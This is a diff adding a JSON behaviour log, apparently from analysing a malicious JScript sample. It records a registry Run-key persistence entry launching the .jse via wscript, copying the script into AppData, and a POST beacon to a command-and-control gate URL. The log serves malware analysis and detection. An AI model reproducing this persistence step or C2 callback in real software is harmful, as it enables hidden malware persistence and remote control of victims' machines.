@@ -1,0 +1,47 @@
+[
+	{
+		"type": "RegWrite",
+		"value": {
+			"key": "HKCU\\software\\microsoft\\windows\\currentversion\\run\\0",
+			"value": "wscript.exe //B \"C:\\Users\\User\\AppData\\Roaming\\0.2638666.jse\"",
+			"type": "REG_SZ"
+		},
+		"description": "The script wrote to a registry key"
+	},
+	{
+		"type": "FileCopy",
+		"value": {
+			"src": "C:Users\\Sysop12\\AppData\\Roaming\\Microsoft\\Templates\\0.2638666.jse",
+			"dest": "C:\\Users\\User\\AppData\\Roaming\\0.2638666.jse"
+		},
+		"description": "The script copied a file."
+	},
+	{
+		"type": "FileWrite",
+		"value": {
+			"file": "C:\\Users\\User\\AppData\\Roaming\\0.2638666.jse",
+			"contents": "(Contents of C:\\Users\\User\\AppData\\Roaming\\0.2638666.jse)"
+		},
+		"description": "The script wrote a file."
+	},
+	{
+		"type": "RegRead",
+		"value": {
+			"key": "HKCU\\Software\\bolt\\GUID"
+		},
+		"description": "The script read a registry key"
+	},
+	{
+		"type": "UrlFetch",
+		"value": {
+			"method": "POST",
+			"url": "http://voubucleonteri.xyz/dimpan/gate.php",
+			"headers": {
+				"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Vivaldi/3.5",
+				"Content-Type": "application/x-www-form-urlencoded"
+			},
+			"body": "bolt=User||JS&id=1"
+		},
+		"description": "The script fetched an URL."
+	}
+]
